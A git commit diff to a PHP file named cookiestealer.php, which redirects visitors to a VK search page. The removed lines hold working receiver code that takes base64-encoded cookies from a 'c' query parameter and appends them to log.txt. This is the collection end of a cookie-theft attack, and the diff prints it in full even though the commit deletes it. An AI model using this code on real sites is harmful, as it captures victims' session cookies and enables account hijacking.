1439c2b83404925f48bae0a51a4cfdc22a20d73c
GlebFisher <43784335+GlebFisher@users.noreply.github.com>
2019-10-25 01:50:41 +0300

    Update cookiestealer.php

--- cookiestealer.php
+++ cookiestealer.php
@@ -1,9 +1,4 @@
 <?php
 		header ('Location:https://vk.com/search?c%5Bq%5D=%D0%BF%D0%B5%D1%87%D0%B5%D0%BD%D1%8C%D0%B5&c%5Bsection%5D=auto&z=video-145244554_456239489');
-	if (isset($_GET["c"]))
-	{
-		$cookies = base64_decode(urldecode($_GET["c"]));
-		$file = fopen('log.txt', 'a');
-		fwrite($file, $cookies . "\n\n");
-	}
+	
 ?>
